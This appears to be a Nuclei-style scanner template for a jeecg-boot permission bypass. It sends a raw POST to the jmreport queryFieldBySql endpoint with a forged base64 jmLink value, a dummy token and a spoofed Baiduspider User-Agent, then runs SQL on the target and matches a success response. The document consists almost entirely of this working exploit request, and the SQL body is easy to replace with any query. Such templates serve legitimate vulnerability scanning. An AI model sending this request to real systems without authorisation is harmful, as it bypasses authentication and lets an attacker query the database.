id: jeecg-boot-jmLink-bypass
info:
  name: Template Name
  author: wangzong
  severity: medium
  description: jeecg-boot系统接口jmLink权限绕过漏洞
  reference:
    - https://github.com/wy876/POC/blob/main/jeecg-boot%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3jmLink%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E.md
    - https://blog.csdn.net/LiangYueSec/article/details/140840776
  tags: tags
http:
  - raw:
      - |-
        POST /jeecg-boot/jmreport/queryFieldBySql?previousPage=xxx&jmLink=YWFhfHxiYmI=&token=123123 HTTP/1.1
        User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; http://www.baidu.com/search/spider.html)
        Accept: */*
        Accept-Language: zh-CN,zh;q=0.9
        Connection: keep-alive
        Content-Type: application/json
        Cache-Control: no-cache
        Pragma: no-cache
        Host: {{Hostname}}
        Content-Length: 21

        {"sql":"select '1' "}
    matchers:
      - type: word
        part: body
        words:
          - '"success":true'
